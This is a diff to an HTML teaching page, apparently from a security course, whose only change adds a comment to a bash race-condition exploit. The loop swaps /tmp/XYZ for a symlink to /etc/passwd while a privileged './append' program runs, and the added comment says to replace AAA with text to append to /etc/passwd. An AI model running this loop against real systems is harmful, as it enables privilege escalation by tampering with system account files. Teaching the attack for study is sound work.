@@ -536,11 +536,12 @@ executable permissions:</p>
 <span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> <span class="kw">((</span><span class="va">i</span><span class="op">=</span><span class="dv">0</span><span class="kw">;</span> <span class="va">i</span> <span class="op">&lt;</span> <span class="va">LIMIT</span><span class="kw">;</span> <span class="va">i</span><span class="op">=</span><span class="va">i</span><span class="op">+</span><span class="dv">1</span><span class="kw">));</span> <span class="cf">do</span></span>
 <span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>  <span class="fu">rm</span> <span class="at">-rf</span> /tmp/XYZ</span>
 <span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>  <span class="fu">touch</span> /tmp/XYZ</span>
-<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>  <span class="kw">(</span><span class="bu">echo</span> AAA <span class="kw">|</span> <span class="fu">nice</span> 19 ./append<span class="kw">)</span> <span class="kw">&amp;</span></span>
-<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>  <span class="fu">unlink</span> /tmp/XYZ</span>
-<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>  <span class="fu">ln</span> <span class="at">-s</span> /etc/passwd /tmp/XYZ </span>
-<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>  <span class="fu">tail</span> <span class="at">-n</span> 1 /etc/passwd</span>
-<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span></code></pre></div>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>  <span class="co"># replace AAA with the text you want appended to /etc/passwd</span></span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>  <span class="kw">(</span><span class="bu">echo</span> AAA <span class="kw">|</span> <span class="fu">nice</span> 19 ./append<span class="kw">)</span> <span class="kw">&amp;</span></span>
+<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>  <span class="fu">unlink</span> /tmp/XYZ</span>
+<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>  <span class="fu">ln</span> <span class="at">-s</span> /etc/passwd /tmp/XYZ </span>
+<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>  <span class="fu">tail</span> <span class="at">-n</span> 1 /etc/passwd</span>
+<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span></code></pre></div>
 <p>If you give this program a higher <code>LIMIT</code> and run it, you
 likely will still not see success – so we need to make our attack
 <em>faster</em>, and <code>./append</code> slower. What ways are there
